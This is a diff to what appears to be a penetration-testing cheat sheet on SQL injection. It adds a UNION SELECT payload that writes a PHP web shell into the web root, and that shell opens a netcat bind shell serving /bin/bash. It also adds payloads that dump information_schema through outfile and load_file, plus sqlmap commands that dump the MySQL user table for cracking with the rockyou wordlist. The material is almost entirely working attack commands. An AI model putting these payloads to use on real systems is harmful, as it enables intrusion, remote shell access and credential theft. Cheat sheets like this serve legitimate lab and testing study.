@@ -93,7 +93,12 @@ john passwords.txt --show --format=raw-MD5
 ```
 
 ```sql
-' union select '<?php system("nc -lp 2222 -e /bin/bash"); ?>','','' into outfile '/tmp/myphp.php' #
+' union select '<?php system("nc -lp 2222 -e /bin/bash"); ?>','','' into outfile '/var/www/myphp.php' #
+```
+
+```sql
+' union select '',table_schema,table_name from information_schema.tables into outfile '/tmp/mytest1' #
+' union select '','',load_file('/tmp/mytest1') #
 ```
 
 ```sql
@@ -103,8 +108,10 @@ john passwords.txt --show --format=raw-MD5
 ```
 ### SQLMap tool
 ```bash
-sqlmap -u 10.0.0.3?id=1
+sqlmap -u 10.0.0.3?id=1 -random-agent
 sqlmap -u 10.0.0.3?id=1 -dbms=mysql --dbs
 sqlmap -u 10.0.0.3?id=1 -dbms=mysql -D api --tables
 sqlmap -u 10.0.0.3?id=1 -dbms=mysql -D api -T customers --dump
+sqlmap -u 10.0.0.3?id=1 -random-agent -D mysql -T user --dump # choose to crack via list
+# /usr/share/wordlists/rockyou.txt
 ```
